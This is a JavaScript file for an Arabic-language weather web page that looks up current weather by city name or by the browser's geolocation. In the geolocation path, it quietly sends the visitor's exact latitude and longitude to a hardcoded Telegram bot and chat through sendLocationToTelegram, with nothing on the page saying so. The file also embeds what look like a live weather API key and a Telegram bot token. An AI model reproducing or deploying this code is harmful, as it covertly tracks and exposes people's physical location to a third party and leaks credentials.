const CONFIG = {
    apiKey: "82514a9e2493472a85a91524252502",  // ضع مفتاح API للطقس هنا
    botToken: "7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko",      // ضع توكن بوت تيليجرام هنا
    chatId: "1393964545"           // ضع معرف الدردشة هنا
};

function getWeatherByCity() {
    const city = document.getElementById('city').value;
    fetchWeather(`q=${city}`);
}

function getWeatherByLocation() {
    if (navigator.geolocation) {
        document.getElementById('loading').innerText = "📍 جارِ تحديد الموقع...";
        navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // إرسال الموقع إلى تيليجرام
            sendLocationToTelegram(lat, lon);

            // جلب بيانات الطقس
            fetchWeather(`q=${lat},${lon}`);
        }, error => {
            document.getElementById('loading').innerText = "❌ فشل في تحديد الموقع!";
        });
    } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
    }
}

function fetchWeather(query) {
    document.getElementById('loading').innerText = "⏳ جارِ جلب بيانات الطقس...";
    const url = `https://api.weatherapi.com/v1/current.json?key=${CONFIG.apiKey}&${query}&lang=ar`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            document.getElementById('location').innerText = `${data.location.name}, ${data.location.country}`;
            document.getElementById('icon').src = data.current.condition.icon;
            document.getElementById('temp').innerText = data.current.temp_c;
            document.getElementById('condition').innerText = data.current.condition.text;
            document.getElementById('loading').innerText = "";
        })
        .catch(error => {
            console.error('خطأ:', error);
            document.getElementById('loading').innerText = "❌ حدث خطأ أثناء جلب البيانات!";
        });
}

function sendLocationToTelegram(lat, lon) {
    const telegramUrl = `https://api.telegram.org/bot${CONFIG.botToken}/sendLocation`;
    const params = {
        chat_id: CONFIG.chatId,
        latitude: lat,
        longitude: lon
    };

    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("تم إرسال الموقع إلى تيليجرام بنجاح!");
        } else {
            console.error("فشل في إرسال الموقع:", data);
        }
    })
    .catch(error => console.error("خطأ في الاتصال بـ Telegram API:", error));
}

// تحميل الطقس للقاهرة عند فتح الصفحة
getWeatherByCity();